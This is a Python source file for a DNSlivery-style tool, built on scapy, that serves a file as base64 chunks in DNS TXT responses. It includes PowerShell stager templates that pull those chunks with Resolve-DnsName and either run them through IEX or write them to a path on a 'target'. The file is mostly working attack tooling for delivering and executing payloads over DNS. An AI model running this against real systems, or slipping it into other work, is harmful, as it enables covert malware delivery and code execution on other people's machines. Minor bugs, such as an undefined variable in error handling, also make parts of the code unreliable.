#! /usr/bin/env python3

import sys
import os
import argparse
import signal
import re
import base64
from scapy.all import *

banner = """
DNSlivery - Easy files and payloads delivery over DNS
"""

def log(message, msg_type = ''):
    reset   = '\033[0;m'

    # set default prefix and color
    prefix  = '[*]'
    color   = reset

    # change prefix and color based on msg_type
    if msg_type == '+':
        prefix  = '[+]'
        color   = '\033[1;32m'
    elif msg_type == '-':
        prefix  = '[-]'
        color   = '\033[1;31m'
    elif msg_type == 'debug':
        prefix  = '[DEBUG]'
        color   = '\033[0;33m'

    print('%s%s %s%s' % (color, prefix, message, reset))

def base64_chunks(clear, size):
    encoded = base64.b64encode(clear)

    # split base64 into chunks of provided size
    encoded_chunks = []
    for i in range(0, len(encoded), size):
        encoded_chunks.append(encoded[i:i + size])

    return encoded_chunks

def signal_handler(signal, frame):
    log('Exiting...')
    sys.exit(0)

def dns_handler(data):
    # only process dns queries
    if data.haslayer(UDP) and data.haslayer(DNS) and data.haslayer(DNSQR):
        # split packet layers
        ip = data.getlayer(IP)
        udp = data.getlayer(UDP)
        dns = data.getlayer(DNS)
        dnsqr = data.getlayer(DNSQR)

        # only process txt queries (type 16)
        if len(dnsqr.qname) != 0 and dnsqr.qtype == 16:
            if args.verbose: log('Received DNS query for %s from %s' % (dnsqr.qname.decode(), ip.src))

            # remove domain part of fqdn and split the different parts of hostname
            hostname = re.sub('%s\.$' % args.domain, '', dnsqr.qname.decode()).split('.')[0]
            hostname = hostname.removeprefix('d')

            try:
                int(hostname)
            except:
                pass
            else:
                response = chunks[int(hostname)-1]
                log('Delivering chunk %s/%d to %s' % (int(hostname), len(chunks), ip.src), '+')

                # build response packet
                rdata = response
                rcode = 0
                dn = args.domain
                an = (None, DNSRR(rrname=dnsqr.qname, type='TXT', rdata=rdata, ttl=1))[rcode == 0]
                ns = DNSRR(rrname=dnsqr.qname, type='NS', ttl=1, rdata=args.nameserver)

                response_pkt = IP(id=ip.id, src=ip.dst, dst=ip.src) / UDP(sport=udp.dport, dport=udp.sport) / DNS(id=dns.id, qr=1, rd=1, ra=1, rcode=rcode, qd=dnsqr, an=an, ns=ns)
                send(response_pkt, verbose=0, iface=args.interface)


if __name__ == '__main__':
    # parse args
    parser = argparse.ArgumentParser(description = banner)
    parser.add_argument('interface', default=None, help='interface to listen to DNS traffic')
    parser.add_argument('domain', default=None, help='FQDN name of the DNS zone')
    parser.add_argument('nameserver', default=None, help='FQDN name of the server running DNSlivery')
    parser.add_argument('-p', '--path', default='.', help='path of directory to serve over DNS (default: pwd)')
    parser.add_argument('-o', '--output', required=True, help='output path on target')
    parser.add_argument('-s', '--size', default='255', help='size in bytes of base64 chunks (default: 255)')
    parser.add_argument('-v', '--verbose', action='store_true', help='increase verbosity')
    args = parser.parse_args()

    print('%s' % banner)

    # verify root
    if os.geteuid() != 0:
        log('Script needs to be run with root privileges to listen for incoming udp/53 packets', '-')
        sys.exit(-1)

    # verify path exists and is readable
    abspath = os.path.abspath(args.path)
    
    if not os.path.exists(abspath):
        log('Path %s does not exist or is not a directory' % abspath, '-')
        sys.exit(-1)

    # launcher and stagers template definition
    launcher_template = 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{Resolve-DnsName -ty TXT -na "%s.%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}))))'

    stager_templates = {
        'print': '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))',
        'exec': 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)}))))',
        'save': '[IO.File]::WriteAllBytes("%s",[System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Resolve-DnsName -ty TXT -na "d$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))',
    }

    # verify args.size is decimal
    if not args.size.isdecimal():
        log('Incorrect size value for base64 chunks', '-')
        sys.exit(-1)

    size = int(args.size)
    try:
        # compute base64 chunks of files
        with open(abspath, 'rb') as f:
            chunks = base64_chunks(f.read(), size)
    except:
        log('Error computing base64 for %s, file will been ignored' % name, '-')

    stager = stager_templates['save'] % (args.output, len(chunks), args.domain)
    print(stager + '\n')

    # display file ready for delivery
    log('File "%s" ready for delivery at %s (%d chunks)' % (abspath, args.domain, len(chunks)))

    # register signal handler
    signal.signal(signal.SIGINT, signal_handler)

    # listen for DNS query
    log('Listening for DNS queries...')

    while True: dns_listener = sniff(filter='udp dst port 53', iface=args.interface, prn=dns_handler)
